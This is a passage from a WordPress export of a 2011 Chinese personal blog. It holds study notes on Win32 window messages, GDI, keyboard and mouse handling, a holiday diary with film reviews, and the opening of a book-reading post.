		<wp:meta_key>_encloseme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_pingme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_encloseme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_pingme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_encloseme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>views</wp:meta_key>
		<wp:meta_value><![CDATA[13]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_encloseme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_pingme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_pingme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_encloseme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							</item>
		<item>
		<title>Windows消息</title>
		<link>http://codemylife.blogcn.com/2011/03/windows%e6%b6%88%e6%81%af/</link>
		<pubDate>Tue, 29 Mar 2011 03:59:48 +0000</pubDate>
		<dc:creator><![CDATA[codemylife]]></dc:creator>
		
		<category><![CDATA[Windows]]></category>

		<category domain="category" nicename="windows"><![CDATA[Windows]]></category>

		<category domain="tag"><![CDATA[Windows]]></category>

		<category domain="tag" nicename="windows"><![CDATA[Windows]]></category>

		<guid isPermaLink="false">http://codemylife.blogcn.com/?p=13</guid>
		<description></description>
		<content:encoded><![CDATA[消息分为“进队消息”和“不进队消息”。

进队消息基本上都是用户输入的结果，比如击键（WM_KEYDOWN、WM_KEYUP），击键产生的字符（WM_CHAR），鼠标移动（WM_MOUSEMOVE），鼠标键（WM_LBUTTONDOWN），时钟消息（WM_TIMER），刷新消息（WM_PAINT），退出消息（WM_QUIT）等。

不进队消息则是其他消息。许多情况下，不进队消息来自调用特定的Windows函数。

消息是以一种有序的同步的方式进出。消息和硬件中断不同，在同一个窗口过程中处理消息时，程序不会被其他消息突然中断。虽然Windows程序可以多线程执行，但每个线程的消息队列只为窗口过程在该线程中执行的窗口处理消息。也就是，消息循环和窗口过程并不是并发执行的。当一个消息循环从消息队列里接受一个消息，然后调用DispatchMessage将消息发送给窗口过程时，直到窗口过程将将控制权返回给Windows，DispatchMessage才能返回。

<strong>WM_CREATE</strong>：在调用CreateWindow或CreateWindowEx时，Windows向窗口过程发送WM_CREATE消息，窗口过程在创建窗口后且在窗口变成可见前收到此消息
参数
wParam：未使用
lParam：指向包含窗口创建信息的结构体CREATESTRUCT的指针
返回值 ：如果窗口过程处理此消息，应返回0以继续创建窗口的过程。返回-1则销毁窗口，此时CreateWindowEx 或 CreateWindow返回空句柄

<strong>WM_PAINT</strong>：当系统或应用程序请求绘制窗口（或窗口的一部分）时，Windows向窗口过程发送WM_PAINT消息，通常是在调UpdateWindow 或 RedrawWindow，或者使用DispatchMessage当应用程序使用GetMessage或PeekMessage获取WM_PAINT消息。
参数
wParam：未使用
lParam ：未使用
返回值：如果窗口过程处理此消息，则应返回0。
附注：一般由系统发送WM_PAINT消息而不是应用程序。对WM_PAINT的处理一般由BeginPaint开始且以EndPaint结束。

<strong>WM_SIZE</strong>：当窗口的大小改变后，WM_SIZE被发送给窗口过程。
参数
wParam：指定改变大小的请求类型。
lParam：低字节标识了新客户区的宽，高字节标识了新客户区的高。
返回值：如果应用程序处理此消息，返回0。
附注：若子窗口调用SetScrollPos或MoveWindow从而产生WM_SIZE消息，那么bRedraw 或 bRepaint应为非0来要求Windows重绘。

<strong>WM_VSCROLL</strong>：当Windows标准垂直滚动条发生滚动事件后，WM_VSCROLL被发送给窗口过程。此消息同样发送给拥有滚动条的控件。
参数
wParam：若低字节为SB_THUMBPOSITION 或 SB_THUMBTRACK，那么高字节标识当前滚动条的位置，否则，未使用。低字节指定滚动条的值标识了用户请求。
lParam：如果此消息是滚动条发送的，lParam是滚动条控件的句柄，否则，为NULL.。
返回值：若应用程序处理此消息，应返回0值。
附注：SB_THUMBTRACK常作为应用程序响应用户拖动滚动条。若应用程序滚动了窗口内容，则应使用SetScrollPos设置滚动条位置。

<strong>WM_COMMAND：</strong>当用户从菜单里选择一个启动的菜单项，或当一个控件向父窗口发送通告消息，或当加速键被翻译。
wParam：高字节：如果消息来自控件，则表示通知码；如果消息来自加速键，值为1；如果消息来自菜单，值为0。
             低字节：表示菜单项，控件，或加速键的ID。
lParam：如果消息来自控件，则表示控件句柄，否则为NULL(0)。
返回值：若应用程序处理此消息，应返回0值。]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>13</wp:post_id>
		<wp:post_date>2011-03-29 11:59:48</wp:post_date>
		<wp:post_date_gmt>2011-03-29 03:59:48</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>windows%e6%b6%88%e6%81%af</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
								<wp:postmeta>
		<wp:meta_key>_edit_last</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_edit_lock</wp:meta_key>
		<wp:meta_value><![CDATA[1343359258]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_pingme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_encloseme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_wp_old_slug</wp:meta_key>
		<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_pingme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_encloseme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_pingme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_encloseme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_pingme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_encloseme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_wp_old_slug</wp:meta_key>
		<wp:meta_value><![CDATA[window%e6%b6%88%e6%81%af]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_encloseme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_pingme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_pingme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_encloseme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_encloseme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_pingme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>views</wp:meta_key>
		<wp:meta_value><![CDATA[15]]></wp:meta_value>
		</wp:postmeta>
							</item>
		<item>
		<title>Windows基础知识</title>
		<link>http://codemylife.blogcn.com/2011/03/windows%e5%9f%ba%e7%a1%80%e7%9f%a5%e8%af%86/</link>
		<pubDate>Tue, 29 Mar 2011 04:19:55 +0000</pubDate>
		<dc:creator><![CDATA[codemylife]]></dc:creator>
		
		<category><![CDATA[Windows]]></category>

		<category domain="category" nicename="windows"><![CDATA[Windows]]></category>

		<category domain="tag"><![CDATA[Windows]]></category>

		<category domain="tag" nicename="windows"><![CDATA[Windows]]></category>

		<guid isPermaLink="false">http://codemylife.blogcn.com/?p=16</guid>
		<description></description>
		<content:encoded><![CDATA[记录Windows最最基础的基础知识!:)
一、<strong>滚动条</strong>
滚动条分为水平滚动条和垂直滚动条。在应用程序中使用水平或锤子滚动条只需要在CreateWindow的第三个参数中包括窗口风格（WS）标识符WS_VSCROLL和WS_HSCROLL即可。客户区不包含滚动条所占的空间。Windows处理对滚动条的所有鼠标操作，但是窗口滚动条没有自动的键盘界面。

Windows对滚动条的处理：
<div id="_mcePaste">
<ul>
	<li><span>处理所有滚动条鼠标事件；</span></li>
	<li><span>当用户在滚动条内单击鼠标时，提供一种“反相视频”闪烁；</span></li>
	<li><span>当用户在滚动条内拖动滚动框时，移动滚动框；</span></li>
	<li><span>为包含滚动条窗口的窗口过程发送滚动条消息。</span></li>
</ul>
</div>
<div id="_mcePaste">应用程序应完成的工作：</div>
<div id="_mcePaste">
<ul>
	<li><span>初始化滚动条的范围和位置；</span></li>
	<li><span>处理窗口过程的滚动条消息；</span></li>
	<li><span>更新滚动条内滚动框的位置；</span></li>
	<li><span>更改客户区的内容以响应对滚动条的更改。</span></li>
</ul>
</div>
<div id="_mcePaste">相关函数</div>
<div id="_mcePaste">
<ul>
	<li><span>设置滚动条位置和范围：SetScrollPos、SetScrollRange。</span></li>
	<li><span>获取滚动条位置和返回：GetScrollPos、GetScrollGange。</span></li>
	<li><span>win32新的函数：SetScrollInfo、GetScrollInfo。</span></li>
</ul>
</div>
<div id="_mcePaste">消息</div>
<div id="_mcePaste">
<ul>
	<li><span>WM_VSCROLL、WM_HSCROLL。</span></li>
</ul>
<span> </span><span>二、<strong>句柄</strong>
句柄是一个四字节（32位无符号）整数值，它用来代表一个内核对象。
与指针的区别：指针包含的是引用对象的内存地址，而句柄是有系统所管理的引用标识，该标识可以被重定位到一个内存地址上。
句柄存在的必要性</span>
<span> </span>

</div>
<div id="_mcePaste">
<ul>
	<li><span>MS出于封装的考虑，隐藏对象内部数据结构。</span></li>
	<li><span>MS出于安全的考虑，隐藏对象首地址，使得程序不能任意修改对象内部数据。</span></li>
	<li><span>操作系统会移动和整理内存，Windows移动对象在内存中的位置后，把新地址告知句柄地址。</span></li>
</ul>
</div>
<div id="_mcePaste">句柄和对象的映射：</div>
<div id="_mcePaste">
<ul>
	<li><span>全等映射。也即对象本身就是一个指针。映射在此时只是类型转换。这种情况有，进程实例句柄、模块句柄和资源句柄等。</span></li>
	<li><span>表格映射。对象指针与句柄常用的映射机制。</span></li>
</ul>
</div>
<div id="_mcePaste">ps:句柄仅在所属的进程中才有意义。句柄定义文件：WinDef.h、WinNT.h</div>
<div id="_mcePaste">三、<strong>图形基础</strong></div>
<div id="_mcePaste">图形设备接口（GDI:Graphics Device Inerface）是Windows的子系统，它负责在视频显示器和打印机上显示图形。</div>
<div id="_mcePaste">版本：在Windows 98和Windowss NT中，图形主要由GDI32.dll动态链接库输出的函数来处理。在windows 98中，GDI32.dll实际利用16位GDI.exe来执行许多函数。在windows NT中，GDI.exe只用于16位的程序。</div>
<div id="_mcePaste">原理：这些动态链接库为你安装的视频显示器和任何打印机调用设备驱动程序中的例程，视频驱动程序访问视频显示器的硬件，打印机驱动程序将GDI命令转换为各种打印机能理解的代码或命令。GDI的主要目的之一是支持设备无关的图形。</div>
<div id="_mcePaste">图形输出设备分为两大类：光栅设备和矢量设备。大多数PC的输出设备是光栅设备，意味着它们以点模式来表示图像，这类设备包括视频显示适配器，点阵打印机和激光打印机。矢量设备使用线来绘制图像，通常局限于绘图仪。</div>
<div id="_mcePaste">不能认为一旦开始了基于像素的程序设计，就抛弃了设备无关性，情况未必如此，诀窍在于是在设备无关的方式中使用像素。这要求图形接口语言为程序提供一些方法来确定设备的硬件特征，并进行适当的调节。</div>
<div id="_mcePaste">GDI函数分类：</div>
<div id="_mcePaste">
<ul>
	<li><span>获取（或创建）和释放（或清除）设备描述表的函数</span></li>
	<li><span>获取有关设备描述表信息的函数</span></li>
	<li><span>绘图函数</span></li>
	<li><span>设置和获取设备描述表参数的函数</span></li>
	<li><span>使用GDI对象的函数</span></li>
</ul>
</div>
设备描述表（Device Content）：设备描述表又称设备上下文，或设备环境，是一种数据结构，它包括了一个设备（显示器或打印机）的绘制属性相关信息。设备描述表和大多数win32结构不同，应用程序不能直接访问设备描述表，只能由各种相关api函数通过设备描述表的句柄间接访问该结构。设备描述表中包含了许多确定GDI函数如何在设备上工作的当前属性。
<div id="_mcePaste">1、获取设备描述表句柄</div>
<div id="_mcePaste">
<ul>
	<li><span>处理WM_PAINT消息时，使用BeginPaint和EndPaint 函数。</span></li>
	<li><span>处理非WM_PAINT消息时，使用GetDC和ReleaseDC 函数。</span></li>
	<li><span>两者的区别：BeginPaint和EndPaint可以删除消息队列中的WM_PAINT消息，并使无效区域有效。GetDC和ReleaseDC并不删除也不能使无效区域有效。</span></li>
</ul>
</div>
<div id="_mcePaste">无效区域：是指需要重画的区域，无效的意思是：当前内容是旧的，过时的。只有当一个窗口消息空闲时，系统才会抽空检查一下这个窗口的无效区域是否为非空（WM_PAINT的优先级是最低的。这也就是为什么系统很忙时窗口和桌面往往会出现变白、刷新不了、留拖拽痕迹等现象的原因）。如果非空，系统就发送WM_PAINT。所以一定要用BeginPaint、EndPaint把无效区域设为空，否则WM_PAINT将一直被发送。</div>
<div id="_mcePaste">2、获取设备描述表信息</div>
<div id="_mcePaste">
<ul>
	<li><span>使用GetDiviceCaps可以获取该设备的信息。</span></li>
</ul>
<div id="_mcePaste">GDI绘图函数</div>
<div>画笔：用于画线条和轮廓，具有颜色、粗细和线条</div>
<div>画刷：用于填充任何闭合的对象，具有颜色、样式，甚至本身可以是位图。</div>
<div>绘图方式：设备描述表中定义的绘图方式也影响显示器上所画线的外观。当Windows使用画笔来画线时，它实际上执行画笔像素和目标位置位置处原来像素之间的某种按位布尔运算。像素间的按位布尔运算叫做“光栅运算”，简记ROP，由于画一条直线只涉及到两种像素（画笔和目标），因此这种布尔运算又称为“二元光栅运算”，简记"ROP2"。</div>
<div>
<ul>
	<li>HGDIOBJ GetStockObject(int fnObject);//获取一个存储对象的类型</li>
	<li>HPEN CreatePen(int fnPenStyle,  int nWidth,  COLORREF crColor);//创建画笔</li>
	<li>HBRUSH CreateSolidBrush(COLORREF crColor) ; //创建画刷（实心）</li>
	<li>HGDIOBJ SelectObject(HDC hdc,  HGDIOBJ hgdiobj);//将obj选进DC</li>
	<li>BOOL DeleteObject(HGDIOBJ hObject);//销毁obj</li>
	<li>COLORREF SetPixel(HDC hdc, int X, int Y, COLORREF crColor);//绘制点</li>
	<li>BOOL MoveToEx(HDC hdc, int X, int Y, LPPOINT lpPoint);  BOOL LineTo(HDC hdc, int nXEnd, int nYEnd);//绘制线</li>
	<li>BOOL Rectangle(HDC hdc, int nLeftRect, int nTopRect, int nRightRect, int nBottomRect);//绘制矩形</li>
	<li>int FrameRect(HDC hDC, CONST RECT *lprc, HBRUSH hbr);//绘制矩形框</li>
	<li>BOOL Ellipse(HDC hdc, int nLeftRect, int nTopRect, int nRightRect, int nBottomRect); //绘制椭圆</li>
	<li>BOOL Polygon(HDC hdc, CONST POINT *lpPoints, int nCount);//绘制多边形</li>
	<li>BOOL PolyBezier(HDC hdc, CONST POINT* lppt, DWORD cPoints);//绘制贝赛尔样条</li>
	<li>COLORREF SetBkColor(HDC hdc, COLORREF crColor);//设置背景颜色</li>
	<li>int SetBkMode(HDC hdc, int iBkMode);//设置背景模式，默认背景模式为OPAQUE</li>
	<li>int SetROP2(HDC hdc, int fnDrawMode);//设置绘图模式，默认绘图模式为R2_COPYPEN</li>
	<li>int SetMapMode(HDC hdc, int fnMapMode);//设置映射方式</li>
</ul>
<div>四、<strong>键盘</strong></div>
键盘是由许多键，一块微控制芯片和支撑的电子设备构成的。当用户按下并释放键盘上的键时，Windows和键盘驱动程序将硬件扫描码转换为格式消息。Windows在系统消息队列中保存这些消息，当Windows应用程序处理完前一个用户输入消息时，Windows才会从系统消息队列里取出下一个消息，并将其放入应用程序消息对列中。

击键消息：WM_KEYDOWN/WM_SYSKEYDOWN，WM_KEYUP/WM_SYSKEYUP
wparam：包含所按下的键的虚拟键码
lparam：包含一个按位编码的状态矢量
WM_SYSKEYDOWN和WM_SYSKEYUP经常由与Alt相组合的击键产生，程序通常忽略此消息而传给DefWindowProc处理。

字符消息：WM_CHAR/WM_SYSCHAR
wparam：包含所按下键的ASCII码
lparam：包含一个按位编码的状态矢量
消息顺序：因为TranslateMessage函数从WM_KEYDOWN 和WM_SYSKEYDOWN消息产生了字符消息，所以字符消息是夹在击键消息之间传递给窗口过程的。典型的顺序是：WM_KEYDOWN-&gt;WM_CHAR-&gt;WM_KEYUP

查询键盘（获取键盘状态）：
<ul>
	<li>BOOL GetKeyboardState(PBYTE lpKeyState);//获取整个键盘按键状态</li>
	<li>SHORT GetKeyState(int nVirtKey);//获取某键的状态，仅在键盘消息处理程序中使用，因为他只有在线程从从消息队列中读取键盘消息时才会报告被查询键的状态</li>
	<li>SHORT GetAsyncKeyState(int vKey);//函数调用时，获取某键的状态</li>
</ul>
<div>五、<strong>鼠标</strong></div>
用户移动鼠标时，Windows在屏幕上移动一个称为“鼠标光标”的小位图。鼠标光标有一个指向显示屏上精确位置的单像素“热点”。Windows支持几种预定义的鼠标光标，程序可以使用这些光标。最常见的ID_ARROW(斜箭头，热点在箭头顶端)；IDC_CROSS(光标，热点在十字交叉线的中心)。

鼠标消息
WM_MOUSEMOVE、WM_*BUTTON*
参数：
int mouse_x = (int)LOWORD(lparam);
int mouse_y = (int)HIWORD(lparam);
int buttons = (int)wparam;

Windows用WM_NCHITTEST消息产生所有其他鼠标消息。下面这样写，你可以禁止窗口中所有客户区和非客户区的鼠标消息。
case WM_NCHITTEST:
return (LRESULT)HTNOWHERE;

</div>
</div>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>16</wp:post_id>
		<wp:post_date>2011-03-29 12:19:55</wp:post_date>
		<wp:post_date_gmt>2011-03-29 04:19:55</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>windows%e5%9f%ba%e7%a1%80%e7%9f%a5%e8%af%86</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
								<wp:postmeta>
		<wp:meta_key>views</wp:meta_key>
		<wp:meta_value><![CDATA[21]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_encloseme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_pingme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_encloseme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_pingme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_edit_last</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_edit_lock</wp:meta_key>
		<wp:meta_value><![CDATA[1343359198]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_pingme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_encloseme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>title</wp:meta_key>
		<wp:meta_value><![CDATA[windws基础知识]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_wp_old_slug</wp:meta_key>
		<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_pingme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_encloseme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_pingme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_encloseme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_encloseme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_pingme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_encloseme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_pingme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_encloseme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_pingme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_pingme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_encloseme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_pingme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_encloseme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_pingme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_encloseme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_pingme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_encloseme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_pingme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_encloseme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_pingme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_encloseme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_pingme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_encloseme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							</item>
		<item>
		<title>面朝大海</title>
		<link>http://codemylife.blogcn.com/2011/04/%e9%9d%a2%e6%9c%9d%e5%a4%a7%e6%b5%b7/</link>
		<pubDate>Tue, 05 Apr 2011 13:18:49 +0000</pubDate>
		<dc:creator><![CDATA[codemylife]]></dc:creator>
		
		<category><![CDATA[随笔]]></category>

		<category domain="category" nicename="%e9%9a%8f%e7%ac%94"><![CDATA[随笔]]></category>

		<guid isPermaLink="false">http://codemylife.blogcn.com/?p=21</guid>
		<description></description>
		<content:encoded><![CDATA[清明节的假期就要过了，明天开始上班。

想想这几天确实也没做什么，放假那天就感冒了，起初还不怎么觉得有什么，晚上吃饭的时候发现自己的声音掉了，才意识到，真的感冒了！平时我穿的衣服不多，因为办公司里有暖气，估计是出来吃饭的时候感冒的，外面的风挺大的。第一天什么也没做，外面下起雨，下午睡了一觉，方觉得感冒好了些，本计划洗澡的，后来想想还是算了，感冒了就小心点吧。晚上去公司里坐了会，看了会书，然后回寝室，睡觉。后来的这两天看了一天的书，另外一天洗澡，洗衣服，理发，看电影。

其实看电影兴致完全是被同事提起来得，看他看的那么有兴致，自己也就想看看，这一看便看了好几部。首先是《婚前试爱》，导演是王晶。豆瓣里的影评挺不错的，“我们要多荒谬，才会相信内疚会让爱持久”。是的，真的是一个谬论，更荒谬的是影片似乎在向我们传达这样的荒谬是正确的，是可原谅的，是可理解的。还是豆瓣影评比较给力：“在这个本身就充满荒谬的时代里，有一些人，他们需要相信一些难以置信的东西，才能给自己理由继续那些荒谬的事。”。和同事讨论了王晶的背景，才知道是拍三级片起家的。不禁感慨，这样的电影确实符合他的胃口，当然也符合大多数人尤其是是男人的胃口。是的，我也不例外，可我相信这种电影对大多数人而言，只是娱乐一下，譬如你工作累了，看看放松下，过了就忘了，仅此而已！电影中重复的貌似格言的话，简直就是在放屁！第二部是《天水围的雾与夜》，导演用叙述的方式将整个情景拼凑起来，这部电影真不好去评论，你会觉得男主角很多地方温情，很多地方又很变态。如此的刻画一个人，让人心里很是纠结！另外，电影里女主角是演的的是四川人，我的家乡，更让人无比感慨！

珍惜身边的幸福，面朝大海，春暖花开！]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>21</wp:post_id>
		<wp:post_date>2011-04-05 21:18:49</wp:post_date>
		<wp:post_date_gmt>2011-04-05 13:18:49</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>%e9%9d%a2%e6%9c%9d%e5%a4%a7%e6%b5%b7</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
								<wp:postmeta>
		<wp:meta_key>_edit_last</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_edit_lock</wp:meta_key>
		<wp:meta_value><![CDATA[1302009531]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_pingme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_encloseme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_wp_old_slug</wp:meta_key>
		<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>views</wp:meta_key>
		<wp:meta_value><![CDATA[7]]></wp:meta_value>
		</wp:postmeta>
							</item>
		<item>
		<title>DOOM启示录</title>
		<link>http://codemylife.blogcn.com/2011/04/doom%e5%90%af%e7%a4%ba%e5%bd%95/</link>
		<pubDate>Fri, 08 Apr 2011 14:37:28 +0000</pubDate>
		<dc:creator><![CDATA[codemylife]]></dc:creator>
		
		<category><![CDATA[读书]]></category>

		<category domain="category" nicename="%e8%af%bb%e4%b9%a6"><![CDATA[读书]]></category>

		<guid isPermaLink="false">http://codemylife.blogcn.com/?p=22</guid>
		<description></description>
		<content:encoded><![CDATA[<img class="alignleft" style="float: left;" src="http://files.blogcn.com/wp01/M00/00/2E/wKgKC03E3KkAAAAAAABBaUPJDhk125.jpg" alt="" width="217" height="277" />昨天下班后开始读《DOOM启示录》，然后就深深的沉浸其中，读完后看了下时间：凌晨3点多，于是赶紧睡觉，明天（oh，是今天）还要上班！

